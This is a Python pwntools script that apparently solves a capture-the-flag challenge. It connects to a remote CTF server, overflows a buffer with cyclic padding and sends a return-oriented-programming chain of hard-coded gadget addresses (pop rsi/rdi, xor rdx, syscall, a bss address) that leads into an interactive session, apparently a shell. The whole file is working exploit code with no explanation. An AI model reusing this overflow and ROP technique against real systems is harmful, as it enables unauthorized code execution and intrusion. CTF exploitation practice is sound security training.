from pwn import *

context(log_level='debug',arch='amd64',os='linux')

filename = "./s.s.a.l"
# io = process(filename)
io = remote('pwn.challenge.ctf.show', 28209)
elf = ELF(filename)
libc = elf.libc

# gdb.attach(io,"b *0x4008cd")

rdx_value = 0x50
payload = flat([cyclic(32)])
payload += p64(rdx_value)*3
io.send(payload)
pause()
payload = "370424"
io.sendline(payload)

zz955 = 0x400802
pop_rsi_rdi_ret = 0x400831
syscall = 0x400760
xor_rdx = 0x400834
bss = 0x601090        

pause()
payload = flat([cyclic(30),zz955,pop_rsi_rdi_ret,pop_rsi_rdi_ret,0,bss,xor_rdx,syscall])
print("len:" + hex(len(payload)))
io.send(payload)

io.interactive()